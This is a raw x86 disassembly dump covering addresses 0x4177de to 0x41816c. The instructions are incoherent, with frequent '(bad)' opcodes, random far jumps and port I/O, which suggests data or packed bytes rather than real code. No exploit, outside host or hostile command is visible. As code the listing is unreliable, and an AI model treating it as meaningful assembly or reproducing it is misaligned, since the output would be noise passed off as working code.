  4177de:	pop    ecx
  4177df:	lods   al,BYTE PTR ds:[esi]
  4177e0:	call   0xc9c3:0xb8b5e552
  4177e7:	add    DWORD PTR ss:[edx+esi*1],edx
  4177eb:	or     BYTE PTR [eax+esi*2-0x6c],0xa
  4177f0:	into   
  4177f1:	out    dx,eax
  4177f2:	imul   ecx,DWORD PTR [ebx+0x6f],0x54
  4177f6:	push   esp
  4177f7:	(bad)  
  4177f8:	neg    BYTE PTR [ecx+0x2616347d]
  4177fe:	dec    ebp
  4177ff:	jbe    0x41782a
  417801:	jp     0x4177a8
  417803:	push   ecx
  417804:	xchg   BYTE PTR [ebx],dh
  417806:	imul   ecx,DWORD PTR [ebp+0x20],0x421df52f
  41780d:	mov    ebp,0x6035ed75
  417812:	lods   al,BYTE PTR ds:[esi]
  417813:	into   
  417814:	cmp    ch,ah
  417816:	(bad)  
  417817:	into   
  417818:	pop    esi
  417819:	fisttp WORD PTR [edi-0x4a70d620]
  41781f:	fmul   st(5),st
  417821:	fstp   QWORD PTR [ebp-0x1a]
  417824:	adc    DWORD PTR [esi-0x52],eax
  417827:	lock outs dx,BYTE PTR ds:[esi]
  417829:	pop    esi
  41782a:	or     esp,DWORD PTR [esi+0x5e]
  41782d:	fs mov ah,0xf5
  417830:	imul   esi,esp,0xe44a8b40
  417836:	test   esp,eax
  417838:	xchg   esp,eax
  417839:	mov    esi,0x218779b7
  41783e:	pop    ecx
  41783f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417840:	mov    edi,0x8a617394
  417845:	into   
  417846:	push   esp
  417847:	or     eax,0x2039a913
  41784c:	adc    cl,BYTE PTR [edx+edi*1-0x620a1499]
  417853:	or     al,0x47
  417855:	or     al,0xd
  417857:	shl    edx,cl
  417859:	mov    ds:0xd18f059e,eax
  41785e:	popa   
  41785f:	sbb    DWORD PTR [edx+esi*4+0x5],esp
  417863:	std    
  417864:	ror    dl,1
  417866:	shl    ebx,0x26
  417869:	fdiv   st,st(5)
  41786b:	mov    ah,0x38
  41786d:	add    eax,DWORD PTR ds:0x854af789
  417873:	aaa    
  417874:	js     0x41788b
  417876:	sbb    ch,cl
  417878:	fbld   TBYTE PTR [ecx+0x42]
  41787b:	push   edx
  41787c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41787d:	sub    ecx,ecx
  41787f:	jmp    0xb253:0x485bcda6
  417886:	ja     0x41780c
  417888:	shr    DWORD PTR [edi+0x3e],1
  41788b:	sub    edx,eax
  41788d:	adc    DWORD PTR [ebp-0x5c],edi
  417890:	inc    edi
  417891:	out    dx,al
  417892:	cld    
  417893:	mov    edi,0x18716bbd
  417898:	xchg   ecx,eax
  417899:	(bad)  [ebx+0x35]
  41789c:	xchg   edi,eax
  41789d:	cmp    bl,BYTE PTR [ecx+0xa2a4706]
  4178a3:	sub    eax,0x67fa1931
  4178a8:	dec    ebx
  4178a9:	or     al,0x63
  4178ab:	add    eax,0x5c2ee8b3
  4178b0:	shl    DWORD PTR [ebp+0x7ddeca42],1
  4178b6:	cdq    
  4178b7:	out    dx,al
  4178b8:	les    esi,FWORD PTR [ecx-0x9ca4b9b]
  4178be:	jl     0x4178b0
  4178c0:	pop    ebx
  4178c1:	aam    0x58
  4178c3:	into   
  4178c4:	mov    esp,0x1404524d
  4178c9:	daa    
  4178ca:	ret    0xe3ec
  4178cd:	cwde   
  4178ce:	fistp  WORD PTR [ebp-0x35]
  4178d1:	loop   0x41785d
  4178d3:	lods   al,BYTE PTR ds:[esi]
  4178d4:	jbe    0x417944
  4178d6:	cmp    BYTE PTR [edx+esi*8],al
  4178d9:	es mov ebx,0x385381b1
  4178df:	pop    ecx
  4178e0:	xor    DWORD PTR [edi+0x2a],0xf1c0581e
  4178e7:	add    ebx,ebx
  4178e9:	bswap  ebx
  4178eb:	add    edx,DWORD PTR [ecx]
  4178ed:	xor    esi,DWORD PTR ss:[esi-0x1a5272d2]
  4178f4:	mov    esi,0xb9a1860f
  4178f9:	adc    dl,bh
  4178fb:	sbb    eax,0x8ed8d4c7
  417900:	in     al,dx
  417901:	das    
  417902:	mov    bl,0xea
  417904:	pop    eax
  417905:	jnp    0x417950
  417907:	ins    DWORD PTR es:[edi],dx
  417908:	stos   BYTE PTR es:[edi],al
  417909:	cmp    bl,bh
  41790b:	push   0x23
  41790d:	retf   
  41790e:	jmp    0x4178ae
  417910:	inc    ebx
  417911:	add    ebp,edi
  417913:	sub    BYTE PTR [edi+eax*8],bl
  417916:	pop    esi
  417917:	(bad)
  41791a:	pop    ss
  41791b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41791c:	int3   
  41791d:	stos   BYTE PTR es:[edi],al
  41791e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41791f:	call   0xe71b:0x449ab440
  417926:	test   esp,edi
  417928:	test   eax,0xe4641f77
  41792d:	gs cmp al,0x9f
  417930:	jno    0x417986
  417932:	lds    edx,FWORD PTR [esi+0x1d]
  417935:	test   cl,bh
  417937:	cmp    ch,BYTE PTR [ebx+ecx*2+0x6cf7c159]
  41793e:	mov    bh,0xe4
  417940:	or     BYTE PTR [edi+eiz*8-0x59],dh
  417944:	(bad)  
  417945:	fwait
  417946:	cmp    al,0x1f
  417948:	jns    0x41794a
  41794a:	(bad)  
  41794b:	jb     0x417992
  41794d:	in     al,dx
  41794e:	(bad)  
  41794f:	mov    cs,WORD PTR [edx-0x4d]
  417952:	stc    
  417953:	adc    al,bh
  417955:	int    0x30
  417957:	cs sti 
  417959:	jnp    0x4178ff
  41795b:	gs add eax,0xa21e1ce
  417961:	test   al,0xfe
  417963:	clc    
  417964:	outs   dx,BYTE PTR ds:[esi]
  417965:	jge    0x417995
  417967:	call   0xc04c:0x88a5f79e
  41796e:	fistp  QWORD PTR [ebp-0x2803465f]
  417974:	test   eax,0x521eecc3
  417979:	push   edx
  41797a:	mov    ebx,0xcfde9d58
  41797f:	pop    ecx
  417980:	test   BYTE PTR [ebx],dh
  417982:	xchg   ebp,eax
  417983:	fist   DWORD PTR [ebx-0x1]
  417986:	adc    eax,0xe389770f
  41798b:	and    BYTE PTR [esi-0x303b6d9c],dl
  417991:	imul   ebp,DWORD PTR [ebx-0x2d],0x7f
  417995:	cmp    al,0x87
  417997:	inc    esi
  417998:	scas   al,BYTE PTR es:[edi]
  417999:	xchg   ebp,eax
  41799a:	aas    
  41799b:	loopne 0x41793f
  41799d:	jne    0x41797a
  41799f:	shl    bh,1
  4179a1:	(bad)  
  4179a2:	adc    BYTE PTR [ecx],ch
  4179a4:	fadd   st(5),st
  4179a6:	int    0xe9
  4179a8:	xchg   DWORD PTR [ecx-0x45],edx
  4179ab:	xchg   ecx,eax
  4179ac:	dec    esp
  4179ad:	dec    edx
  4179ae:	in     al,dx
  4179af:	(bad)  
  4179b0:	ja     0x417974
  4179b2:	(bad)  
  4179b3:	inc    edx
  4179b4:	aam    0xd6
  4179b6:	(bad)  
  4179b7:	loope  0x4179f5
  4179b9:	xchg   edx,eax
  4179ba:	xchg   esi,eax
  4179bb:	push   edx
  4179bc:	fnsave [esi+0x2e1e915b]
  4179c2:	jmp    FWORD PTR [eax]
  4179c4:	xchg   esi,eax
  4179c5:	call   0x7665:0x1ac95cc4
  4179cc:	jns    0x4179f0
  4179ce:	xlat   BYTE PTR ds:[ebx]
  4179cf:	xor    eax,0x4009ffaf
  4179d4:	jmp    0x417965
  4179d6:	bnd jmp 0x41798c
  4179d9:	xchg   edx,eax
  4179da:	outs   dx,BYTE PTR ds:[esi]
  4179db:	hlt    
  4179dc:	dec    ecx
  4179dd:	sub    eax,0xf230dc2a
  4179e2:	sub    esp,edi
  4179e4:	sbb    al,0x76
  4179e6:	shl    ah,cl
  4179e8:	xchg   edi,eax
  4179e9:	out    dx,eax
  4179ea:	and    eax,0x8b15a8
  4179ef:	out    0x46,al
  4179f1:	nop
  4179f2:	in     eax,dx
  4179f3:	mov    esp,0x47de6c06
  4179f8:	(bad)  
  4179f9:	rol    DWORD PTR [eax+edi*2+0x64],1
  4179fd:	mov    ebx,0x37c3e15c
  417a02:	inc    edx
  417a03:	sbb    DWORD PTR [eax-0x70],edx
  417a06:	dec    ebx
  417a07:	leave  
  417a08:	sbb    ecx,eax
  417a0a:	mov    ebp,0x39d27667
  417a0f:	jmp    0x5041:0xff999f47
  417a16:	dec    ecx
  417a17:	adc    BYTE PTR [edx+0x8],bh
  417a1a:	push   es
  417a1b:	out    0x62,eax
  417a1d:	dec    esp
  417a1e:	dec    edi
  417a1f:	arpl   WORD PTR [edx],bp
  417a21:	cli    
  417a22:	and    DWORD PTR [ebp+0x4],0x1e
  417a26:	enter  0x5bca,0x48
  417a2a:	ds xchg ah,bl
  417a2d:	pop    ss
  417a2e:	add    eax,0xf2d1c1b7
  417a33:	loop   0x417a89
  417a35:	adc    ah,BYTE PTR [ebx]
  417a37:	or     DWORD PTR [eax+0x25fa704c],esp
  417a3d:	(bad)  
  417a3e:	int    0xaa
  417a40:	sbb    BYTE PTR [esi],cl
  417a42:	in     eax,dx
  417a43:	jbe    0x417a8c
  417a45:	cmp    DWORD PTR [esi-0x66],edi
  417a48:	ins    BYTE PTR es:[edi],dx
  417a49:	leave  
  417a4a:	je     0x417a54
  417a4c:	xor    cl,0xe8
  417a4f:	fsub   QWORD PTR [eax-0x404c0180]
  417a55:	and    ebx,edx
  417a57:	mov    ecx,0x688f33ab
  417a5c:	jnp    0x417a25
  417a5e:	stos   BYTE PTR es:[edi],al
  417a5f:	std    
  417a60:	mov    DWORD PTR [esi],eax
  417a62:	push   ds
  417a63:	call   FWORD PTR [edx+ecx*4-0x5213ef59]
  417a6a:	or     edi,edx
  417a6c:	push   edx
  417a6d:	lea    esp,[ebp-0x7a9b6729]
  417a73:	(bad)  
  417a74:	mov    ds:0xa430a3e2,eax
  417a79:	js     0x417ad5
  417a7b:	sub    al,0x50
  417a7d:	add    BYTE PTR [esi+esi*2+0x2cd4b1cb],al
  417a84:	shl    al,0x1f
  417a87:	jmp    0x60d49f99
  417a8c:	mov    BYTE PTR [ebp+ebp*4+0x7a02f8d7],dl
  417a93:	adc    DWORD PTR [ebp-0x35],esi
  417a96:	imul   eax,esp,0x4973839d
  417a9c:	in     al,dx
  417a9d:	test   al,0xab
  417a9f:	push   ecx
  417aa0:	gs pop edi
  417aa2:	pop    ebp
  417aa3:	out    dx,al
  417aa4:	ss pusha 
  417aa6:	out    0x8c,eax
  417aa8:	xchg   ecx,eax
  417aa9:	dec    esi
  417aaa:	addr16 fldl2e 
  417aad:	fisubr WORD PTR ds:0xd839e20b
  417ab3:	cmp    eax,0xc08054af
  417ab8:	test   al,0x83
  417aba:	daa    
  417abb:	inc    edi
  417abc:	jnp    0x417a84
  417abe:	pop    edx
  417abf:	jnp    0x417ae9
  417ac1:	cmp    eax,0xa12edaf3
  417ac6:	dec    ecx
  417ac7:	nop
  417ac8:	pop    ebp
  417ac9:	fcmovnbe st,st(0)
  417acb:	sbb    edx,DWORD PTR [edx+0x28f776b5]
  417ad1:	or     edx,DWORD PTR [ecx-0x601dcc7f]
  417ad7:	inc    esp
  417ad8:	adc    al,0x79
  417ada:	mov    ch,0x67
  417adc:	daa    
  417add:	mov    ds:0x475552ad,al
  417ae2:	lods   al,BYTE PTR ds:[esi]
  417ae3:	mov    DWORD PTR [ebx+eax*1+0x58],eax
  417ae7:	in     al,0x21
  417ae9:	pop    ecx
  417aea:	xor    DWORD PTR [ebx-0x46],edi
  417aed:	and    bh,BYTE PTR [ebx+0x3be0945e]
  417af3:	xchg   esi,eax
  417af4:	xchg   esp,eax
  417af5:	jp     0x417a86
  417af7:	scas   al,BYTE PTR es:[edi]
  417af8:	aad    0x4c
  417afa:	imul   ecx,DWORD PTR [ecx+0x100925a],0xffffffe7
  417b01:	inc    esp
  417b02:	loope  0x417b5a
  417b04:	into   
  417b05:	cmp    al,0x32
  417b07:	mov    esp,0xd8002299
  417b0c:	cmc    
  417b0d:	je     0x417ab7
  417b0f:	inc    edx
  417b10:	xor    al,0xc
  417b12:	mov    ebx,0xc58f0edb
  417b17:	inc    ebp
  417b18:	adc    eax,0xc408dd04
  417b1d:	xchg   DWORD PTR [edx-0x61025a0f],ecx
  417b23:	js     0x417b33
  417b25:	das    
  417b26:	sub    BYTE PTR [edi+esi*8],al
  417b29:	rcr    BYTE PTR [ebx+0x23],0x32
  417b2d:	mov    edi,fs
  417b2f:	mov    cl,0x6e
  417b31:	aad    0x6b
  417b33:	jno    0x417b41
  417b35:	mov    ah,0x87
  417b37:	sbb    dh,dl
  417b39:	xchg   edx,eax
  417b3a:	retf   0xefe5
  417b3d:	add    ebx,edx
  417b3f:	rcl    esp,cl
  417b41:	jl     0x417b49
  417b43:	outs   dx,DWORD PTR ds:[esi]
  417b44:	cs jo  0x417b3d
  417b47:	int3   
  417b48:	inc    ebp
  417b4a:	pop    edx
  417b4b:	pop    ds
  417b4c:	popa   
  417b4d:	sbb    ebp,DWORD PTR [eax]
  417b4f:	stos   BYTE PTR es:[edi],al
  417b50:	jle    0x417ae7
  417b52:	mov    DWORD PTR [edi+ebp*4],ebp
  417b55:	aad    0x87
  417b57:	into   
  417b58:	aam    0xaf
  417b5a:	xchg   ebp,eax
  417b5b:	(bad)  
  417b5c:	push   ebp
  417b5d:	stc    
  417b5e:	sub    eax,0x6da05335
  417b63:	fisttp QWORD PTR [edi-0x11]
  417b66:	test   al,0xc5
  417b68:	mov    al,ds:0xe2d795f0
  417b6d:	ret    
  417b6e:	jnp    0x417bdb
  417b70:	xor    DWORD PTR [edx+0xa],ebx
  417b73:	mov    DWORD PTR [ebx+0x59],ebx
  417b76:	pusha  
  417b77:	aad    0x5b
  417b79:	adc    eax,0xa2bc3974
  417b7e:	ja     0x417bbd
  417b80:	dec    esp
  417b81:	sbb    ebp,ecx
  417b83:	outs   dx,DWORD PTR ds:[esi]
  417b84:	push   eax
  417b85:	imul   ebp,DWORD PTR [ebp+0x182a0a00],0x671209d3
  417b8f:	jnp    0x417b4f
  417b91:	mov    ebp,0xc0bd8cc8
  417b96:	scas   eax,DWORD PTR es:[edi]
  417b97:	or     edx,esp
  417b99:	cmovg  eax,eax
  417b9c:	add    al,0x4
  417b9e:	fbld   TBYTE PTR [eax]
  417ba0:	ins    DWORD PTR es:[edi],dx
  417ba1:	cwde   
  417ba2:	jno    0x417bcf
  417ba4:	fsubr  DWORD PTR [ecx-0x4d837785]
  417baa:	push   ss
  417bab:	jns    0x417be1
  417bad:	xchg   esp,eax
  417bae:	shr    DWORD PTR [ecx-0x79],0x81
  417bb2:	imul   ebx,DWORD PTR [ebx-0x2c],0xffffffda
  417bb6:	fs jbe 0x417c2f
  417bb9:	jp     0x417bd1
  417bbb:	xchg   edx,eax
  417bbc:	xchg   ebx,eax
  417bbd:	es shl al,cl
  417bc0:	mov    ds:0xaad34d28,eax
  417bc5:	test   BYTE PTR [esi],bl
  417bc7:	out    dx,al
  417bc8:	retf   0xf9db
  417bcb:	fadd   DWORD PTR [eax+0x3e]
  417bce:	shl    BYTE PTR [ecx],0x30
  417bd1:	push   edi
  417bd2:	cld    
  417bd3:	(bad)  
  417bd5:	dec    ebp
  417bd6:	push   eax
  417bd7:	frstor [ebx+0x5f9fc3a0]
  417bdd:	mov    edi,0xd632bd14
  417be2:	push   ebp
  417be3:	push   ecx
  417be4:	out    dx,al
  417be5:	(bad)  
  417be6:	or     al,0x8d
  417be8:	test   BYTE PTR [edi],al
  417bea:	mov    ebp,0x918a67f8
  417bef:	push   esi
  417bf0:	pop    ss
  417bf1:	dec    edi
  417bf2:	inc    eax
  417bf3:	push   0x1b3bd041
  417bf8:	ins    DWORD PTR es:[edi],dx
  417bf9:	add    al,0x43
  417bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bfc:	pop    es
  417bfd:	pop    edi
  417bfe:	jecxz  0x417b91
  417c00:	lock jne 0x417bc5
  417c03:	push   cs
  417c04:	push   esi
  417c05:	(bad)  
  417c07:	mov    al,0x0
  417c09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c0a:	fisub  DWORD PTR [edi+0x1a]
  417c0d:	jmp    0x417bef
  417c0f:	aad    0xce
  417c11:	add    dl,bh
  417c13:	cmp    cl,cl
  417c15:	fucom  st(0)
  417c17:	mov    cl,0x41
  417c19:	jg     0x417c8f
  417c1b:	loop   0x417c67
  417c1d:	dec    ebx
  417c1e:	sub    eax,0xffca471b
  417c23:	jne    0x417bbf
  417c25:	fnstsw WORD PTR [edx+eiz*2]
  417c28:	push   0x60
  417c2a:	or     eax,0x60103607
  417c2f:	mov    ?,WORD PTR [eax+0x6ae4c684]
  417c35:	loope  0x417c7d
  417c37:	test   eax,0x5b406ef1
  417c3c:	adc    al,al
  417c3e:	je     0x417c2a
  417c40:	add    al,BYTE PTR [esp+edi*4+0x0]
  417c44:	(bad)  
  417c45:	ins    BYTE PTR es:[edi],dx
  417c46:	jne    0x417c2d
  417c48:	cmp    DWORD PTR [esp+edi*8+0x54],ebx
  417c4c:	push   esp
  417c4d:	enter  0xe502,0x19
  417c51:	pop    ebp
  417c52:	jae    0x417c28
  417c54:	pop    es
  417c55:	jl     0x417c09
  417c57:	adc    al,0x3d
  417c59:	ins    DWORD PTR es:[edi],dx
  417c5a:	mov    ah,0x48
  417c5c:	out    0x54,eax
  417c5e:	xchg   ebx,eax
  417c5f:	xor    DWORD PTR [ecx+0x56],eax
  417c62:	cmp    eax,0xadcd630
  417c67:	jo     0x417c6e
  417c69:	xchg   BYTE PTR [ecx-0x34],cl
  417c6c:	xchg   ecx,eax
  417c6d:	sahf   
  417c6e:	int    0x9
  417c70:	push   ebp
  417c71:	loopne 0x417bf3
  417c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c74:	xchg   ebx,eax
  417c75:	dec    edx
  417c76:	icebp  
  417c77:	loope  0x417c4f
  417c79:	in     eax,0x4b
  417c7b:	and    DWORD PTR [esi+0x48],0x3c0ed481
  417c82:	call   0x4b5a9999
  417c87:	inc    ecx
  417c88:	lea    edx,[ebp-0x29]
  417c8b:	xor    edx,DWORD PTR ds:0xf0223c2
  417c91:	dec    ebx
  417c92:	stos   DWORD PTR es:[edi],eax
  417c93:	enter  0x11bf,0x14
  417c97:	aaa    
  417c98:	sbb    cl,BYTE PTR [esi]
  417c9a:	lea    ebp,[ebx]
  417c9c:	mov    ch,0xae
  417c9e:	das    
  417c9f:	into   
  417ca0:	mov    eax,DWORD PTR [ecx]
  417ca2:	shr    BYTE PTR [esi],1
  417ca4:	or     dh,BYTE PTR [edx+edx*2-0x54]
  417ca8:	dec    ebx
  417ca9:	aad    0x11
  417cab:	pop    edx
  417cac:	pop    DWORD PTR [esi]
  417cae:	xchg   ecx,eax
  417caf:	adc    bh,BYTE PTR [edi]
  417cb1:	dec    eax
  417cb2:	adc    ebx,DWORD PTR [eax-0x5624f94e]
  417cb8:	outs   dx,BYTE PTR ds:[esi]
  417cb9:	jecxz  0x417c94
  417cbb:	fstp   TBYTE PTR [ebx+0x2d]
  417cbe:	gs hlt 
  417cc0:	test   DWORD PTR [ebp+0x2cbf9afb],ebp
  417cc6:	cmp    esp,DWORD PTR [edx-0x76bb1562]
  417ccc:	jb     0x417d16
  417cce:	aad    0x69
  417cd0:	pop    es
  417cd1:	les    edx,FWORD PTR [edx]
  417cd3:	mov    esi,0xf1ac4130
  417cd8:	ds dec ebp
  417cda:	out    0xa2,eax
  417cdc:	push   esp
  417cdd:	jmp    0x417cca
  417cdf:	xor    eax,0x4ac8114f
  417ce4:	imul   ebp,ebx,0x2c41984d
  417cea:	mov    WORD PTR [esi],?
  417cec:	test   DWORD PTR [ecx],edi
  417cee:	mov    BYTE PTR ds:0xa36ef125,ah
  417cf4:	cli    
  417cf5:	mov    esp,0x6f089c85
  417cfa:	sub    al,0xe0
  417cfc:	(bad)  
  417cfd:	(bad)  
  417cfe:	or     DWORD PTR [esi+0x2a],0xffffffe9
  417d02:	mov    ecx,0xdab75e58
  417d07:	cwde   
  417d08:	rcr    cl,1
  417d0a:	(bad)  
  417d0b:	jg     0x417d0b
  417d0d:	lods   eax,DWORD PTR ds:[esi]
  417d0e:	pushf  
  417d0f:	jl     0x417d4a
  417d11:	sub    dl,BYTE PTR [eax]
  417d13:	nop
  417d14:	mul    dl
  417d16:	inc    ebx
  417d17:	fsub   QWORD PTR [edx-0x394951de]
  417d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d1e:	not    DWORD PTR [ecx+ebp*2+0x42]
  417d22:	mov    eax,ds:0x1389834f
  417d27:	add    esp,DWORD PTR [ecx+0xf909efb]
  417d2d:	fcom   DWORD PTR [ebx+ecx*8]
  417d30:	push   ds
  417d31:	dec    eax
  417d32:	imul   DWORD PTR [eax]
  417d34:	mov    esp,ecx
  417d36:	fld    QWORD PTR [edi-0x69772e4e]
  417d3c:	sub    al,0xa1
  417d3e:	lods   eax,DWORD PTR ds:[esi]
  417d3f:	mov    bl,0x74
  417d41:	ja     0x417cec
  417d43:	xchg   ebx,eax
  417d44:	mov    ecx,0x4dcfe52a
  417d49:	mov    ds:0xa42d369e,al
  417d4e:	cmp    bl,al
  417d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d51:	sti    
  417d52:	sub    DWORD PTR [esi+0x6672cfde],ecx
  417d58:	fmulp  st(1),st
  417d5a:	jp     0x417db5
  417d5c:	cld    
  417d5d:	hlt    
  417d5e:	xchg   ecx,eax
  417d5f:	ret    0x62b4
  417d62:	and    ebp,0xffffffbb
  417d65:	mov    ah,0xb6
  417d67:	jmp    FWORD PTR [ecx]
  417d69:	lods   al,BYTE PTR ds:[esi]
  417d6a:	pushf  
  417d6b:	cmp    eax,0x9ce12874
  417d70:	scas   al,BYTE PTR es:[edi]
  417d71:	nop
  417d72:	frstor [esi+0x1e]
  417d75:	test   DWORD PTR [esi-0x62293c7a],esp
  417d7b:	loopne 0x417dbd
  417d7d:	pop    ebp
  417d7e:	or     BYTE PTR [ecx-0x59907065],cl
  417d84:	mov    cl,0x98
  417d86:	and    DWORD PTR gs:[edx],0x72
  417d8a:	inc    eax
  417d8b:	fdivr  DWORD PTR [edx]
  417d8d:	mov    bl,0x7c
  417d8f:	pop    esp
  417d90:	sahf   
  417d91:	or     cl,BYTE PTR [eax]
  417d93:	xchg   edx,eax
  417d94:	ins    BYTE PTR es:[edi],dx
  417d95:	cdq    
  417d96:	mov    ds:0x177431dd,eax
  417d9b:	clc    
  417d9c:	popa   
  417d9d:	test   eax,0xc0a40d09
  417da2:	icebp  
  417da3:	std    
  417da4:	adc    esp,edx
  417da6:	cmp    DWORD PTR [edi],esi
  417da8:	cmp    BYTE PTR [edx+0x4cd9a862],cl
  417dae:	pop    ss
  417daf:	repz jnp 0x417d52
  417db2:	inc    esi
  417db3:	jge    0x417dc4
  417db5:	fisubr WORD PTR [edx-0x5af27b1f]
  417dbb:	push   ebp
  417dbc:	cdq    
  417dbd:	dec    edx
  417dbe:	sar    DWORD PTR [edi+ecx*8],1
  417dc1:	jnp    0x417df5
  417dc3:	mov    ch,0xf3
  417dc5:	pop    esi
  417dc6:	cwde   
  417dc7:	call   0xc57bd678
  417dcc:	push   0xf7ffb6af
  417dd1:	jae    0x417e39
  417dd3:	cmc    
  417dd4:	mov    ch,0x11
  417dd6:	or     DWORD PTR ds:0x8a295583,edx
  417ddc:	nop
  417ddd:	adc    al,0xc4
  417ddf:	mov    bh,0xf2
  417de1:	aaa    
  417de2:	ret    0xf01c
  417de5:	fisttp QWORD PTR [edi+edx*1-0x89add8b]
  417dec:	inc    esi
  417ded:	out    0xad,eax
  417def:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417df0:	call   0x3e58:0x596a8d44
  417df7:	sti    
  417df8:	fldcw  WORD PTR [ebx-0x5c]
  417dfb:	test   ebp,ebx
  417dfd:	jp     0x417de3
  417dff:	push   edx
  417e00:	sbb    cl,BYTE PTR [edx-0x78]
  417e03:	in     eax,dx
  417e04:	ins    DWORD PTR es:[edi],dx
  417e05:	jp     0x417db3
  417e07:	add    al,BYTE PTR [ebp-0x17]
  417e0a:	out    0x64,al
  417e0c:	in     eax,dx
  417e0d:	add    bh,BYTE PTR [edx+0x41]
  417e10:	dec    ecx
  417e11:	mov    ch,0x1d
  417e13:	push   ecx
  417e14:	cmp    al,BYTE PTR [esi+0x4e]
  417e17:	dec    ecx
  417e18:	pushf  
  417e19:	and    BYTE PTR [ebp-0x2e596793],al
  417e1f:	mov    bh,ah
  417e21:	mov    bh,0xd9
  417e23:	ja     0x417da5
  417e25:	or     eax,0xf7870901
  417e2a:	mov    WORD PTR [eax+esi*4+0x5accff0c],ax
  417e32:	or     eax,DWORD PTR [esi]
  417e34:	cmc    
  417e35:	in     al,0x63
  417e37:	in     eax,dx
  417e38:	jmp    0x69e0:0xb7d3d2aa
  417e3f:	jae    0x417e63
  417e41:	and    DWORD PTR [ecx],ebx
  417e43:	xchg   ebp,eax
  417e44:	add    cl,BYTE PTR [edi+0x44]
  417e47:	das    
  417e48:	add    al,0x94
  417e4a:	mov    eax,ds:0x83441fd1
  417e4f:	sbb    eax,0xe9dc25bb
  417e54:	test   eax,0x635a2410
  417e59:	adc    DWORD PTR [edx+edx*8],edi
  417e5c:	sbb    dl,bh
  417e5e:	mov    ?,ebp
  417e60:	adc    DWORD PTR cs:[edx-0x29],ecx
  417e64:	sub    eax,0x7a0abca0
  417e69:	push   ecx
  417e6a:	neg    ecx
  417e6c:	aas    
  417e6d:	add    ecx,DWORD PTR [esi+eiz*8+0xbd84]
	...
  418048:	add    BYTE PTR [eax],al
  41804a:	pushf  
  41804b:	sbb    al,bl
  41804d:	push   esi
  41804e:	(bad)  
  418050:	sahf   
  418051:	fidivr DWORD PTR [esi-0x64]
  418054:	add    al,ah
  418056:	or     al,bl
  418058:	sub    ah,BYTE PTR [edx-0x65]
  41805b:	scas   eax,DWORD PTR es:[edi]
  41805c:	add    DWORD PTR [eax],eax
  41805e:	push   ds
  41805f:	pop    es
  418060:	add    BYTE PTR [eax],al
  418062:	pop    eax
  418063:	add    al,0x85
  418065:	fs cmc 
  418067:	xchg   cl,dl
  418069:	fild   QWORD PTR [esi-0x39]
  41806c:	(bad)  
  41806d:	sti    
  41806e:	pop    ss
  41806f:	fs out dx,eax
  418071:	dec    edi
  418072:	sub    BYTE PTR [ebp-0x17745372],al
  418078:	test   BYTE PTR [ebx-0x3b147784],bh
  41807e:	test   eax,0xffbb02f5
  418083:	adc    ah,BYTE PTR [ecx+0x64]
  418086:	jo     0x418071
  418088:	inc    esi
  418089:	pop    esp
  41808a:	stos   DWORD PTR es:[edi],eax
  41808b:	mov    ecx,0x320d555b
  418090:	cmp    BYTE PTR [esi-0x132d8bca],0xfa
  418097:	repz inc ebp
  418099:	pop    esp
  41809a:	pushf  
  41809b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41809c:	sbb    eax,0x8a3f9644
  4180a1:	ss jmp 0x41806f
  4180a4:	loope  0x418076
  4180a6:	mov    al,0xee
  4180a8:	scas   eax,DWORD PTR es:[edi]
  4180a9:	mov    esp,0xe4fcca8e
  4180ae:	test   edx,esi
  4180b0:	out    dx,al
  4180b1:	pushf  
  4180b2:	inc    ebx
  4180b3:	sub    dh,bl
  4180b5:	pop    edi
  4180b6:	loope  0x4180f1
  4180b8:	or     ecx,eax
  4180ba:	imul   esp,DWORD PTR [ecx],0x92568881
  4180c0:	mov    ah,0x4a
  4180c2:	mov    ds:0x1790c258,al
  4180c7:	rcr    DWORD PTR [ecx+0x6178a5ee],1
  4180cd:	aam    0xa2
  4180cf:	cmp    eax,0xd2e26f86
  4180d4:	arpl   WORD PTR [edi],bx
  4180d6:	mov    WORD PTR [edx+0x2d],ss
  4180d9:	pop    es
  4180da:	jno    0x418078
  4180dc:	loopne 0x4180dc
  4180de:	or     BYTE PTR [ebx],al
  4180e0:	retf   0xc778
  4180e3:	in     eax,0x32
  4180e5:	shl    DWORD PTR [ebx+0x6a86b462],0xf
  4180ec:	rcl    DWORD PTR [ebx],cl
  4180ee:	pop    ds
  4180ef:	jg     0x4180d9
  4180f1:	push   ds
  4180f2:	mov    BYTE PTR [esi-0x1313f92b],ah
  4180f8:	(bad)  
  4180f9:	call   0x5469:0xab21ffb7
  418100:	test   BYTE PTR [ebx+0x588471c],ah
  418106:	jne    0x418172
  418108:	fist   WORD PTR [esi+0x3dd9b781]
  41810e:	fidivr WORD PTR [ebx+0x2406aeaa]
  418114:	fwait
  418115:	jle    0x418180
  418117:	mov    bl,0x3e
  418119:	pop    eax
  41811a:	add    eax,0xbce3d43
  41811f:	push   es
  418120:	loop   0x418181
  418122:	dec    esp
  418123:	xchg   ebx,eax
  418124:	push   edi
  418125:	fs cmp al,0x83
  418128:	dec    esp
  418129:	jg     0x418166
  41812b:	sar    BYTE PTR [edx+0xe],cl
  41812e:	sub    ebx,eax
  418130:	jp     0x41810b
  418132:	addr16 jo 0x418180
  418135:	mov    al,0x6f
  418137:	jmp    0xd9578e30
  41813c:	jmp    0xcb44f919
  418141:	pop    es
  418142:	or     al,0x30
  418144:	mov    bh,0x7d
  418146:	inc    edi
  418147:	frstor [ebx+0x6eac8e3]
  41814d:	int    0xc9
  41814f:	sbb    DWORD PTR [ebx+0x7f],ebp
  418152:	xchg   ebx,eax
  418153:	pop    edx
  418154:	or     dh,BYTE PTR [edx]
  418156:	(bad)  
  418157:	mov    eax,0x934f4738
  41815c:	and    esi,edx
  41815e:	call   0x4c8:0x64a3fe46
  418165:	and    BYTE PTR [ebx],ch
  418167:	mov    ds:0x1d0136e4,al
  41816c:	fcmovnbe st,st(5)
